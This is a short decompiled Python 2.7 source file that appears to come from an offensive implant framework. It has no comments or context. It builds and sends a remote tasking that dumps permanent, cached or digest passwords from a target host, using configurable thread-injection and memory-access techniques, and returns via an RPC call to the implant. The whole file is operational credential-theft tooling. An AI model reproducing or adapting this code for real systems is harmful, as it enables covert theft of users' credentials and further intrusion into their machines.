# uncompyle6 version 2.9.10
# Python bytecode 2.7 (62211)
# Decompiled from: Python 2.7.10 (default, Feb  6 2017, 23:53:20) 
# [GCC 4.2.1 Compatible Apple LLVM 8.0.0 (clang-800.0.34)]
# Embedded file name: Mcl_Cmd_PasswordDump_Tasking.py
CMD_PW_TYPE_ALL = 0
CMD_PW_TYPE_PERMANENT = 1
CMD_PW_TYPE_CACHED = 2
CMD_PW_TYPE_DIGEST = 3

def TaskingMain(namespace):
    import mcl.imports
    import mcl.target
    import mcl.tasking
    import mcl.tasking.technique
    from mcl.object.Message import MarshalMessage
    mcl.imports.ImportWithNamespace(namespace, 'mca.survey.cmd.passworddump', globals())
    mcl.imports.ImportWithNamespace(namespace, 'mca.survey.cmd.passworddump.tasking', globals())
    lpParams = mcl.tasking.GetParameters()
    tgtParams = mca.survey.cmd.passworddump.Params()
    tgtParams.threadProvider = mcl.tasking.technique.Lookup('PASSWORDDUMP', mcl.tasking.technique.TECHNIQUE_MCL_INJECT, lpParams['thread'])
    tgtParams.memoryProvider = mcl.tasking.technique.Lookup('PASSWORDDUMP', mcl.tasking.technique.TECHNIQUE_MCL_MEMORY, lpParams['memory'])
    if lpParams['type'] == CMD_PW_TYPE_ALL:
        tgtParams.type = mca.survey.cmd.passworddump.PARAMS_TYPE_FLAGS_PERMANENT | mca.survey.cmd.passworddump.PARAMS_TYPE_FLAGS_CACHED
    elif lpParams['type'] == CMD_PW_TYPE_PERMANENT:
        tgtParams.type = mca.survey.cmd.passworddump.PARAMS_TYPE_FLAGS_PERMANENT
    elif lpParams['type'] == CMD_PW_TYPE_CACHED:
        tgtParams.type = mca.survey.cmd.passworddump.PARAMS_TYPE_FLAGS_CACHED
    elif lpParams['type'] == CMD_PW_TYPE_DIGEST:
        tgtParams.type = mca.survey.cmd.passworddump.PARAMS_TYPE_FLAGS_DIGEST
    else:
        mcl.tasking.OutputError('Invalid password type (%u)' % lpParams['type'])
        return False
    rpc = mca.survey.cmd.passworddump.tasking.RPC_INFO_DUMP
    msg = MarshalMessage()
    tgtParams.Marshal(msg)
    rpc.SetData(msg.Serialize())
    rpc.SetMessagingType('message')
    taskXml = mcl.tasking.Tasking()
    taskXml.AddProvider(mcl.tasking.technique.TECHNIQUE_MCL_MEMORY, tgtParams.memoryProvider)
    taskXml.AddProvider(mcl.tasking.technique.TECHNIQUE_MCL_INJECT, tgtParams.threadProvider)
    mcl.tasking.OutputXml(taskXml.GetXmlObject())
    res = mcl.tasking.RpcPerformCall(rpc)
    if res != mcl.target.CALL_SUCCEEDED:
        mcl.tasking.RecordModuleError(res, 0, mca.survey.cmd.passworddump.errorStrings)
        return False
    return True


if __name__ == '__main__':
    import sys
    if TaskingMain(sys.argv[1]) != True:
        sys.exit(-1)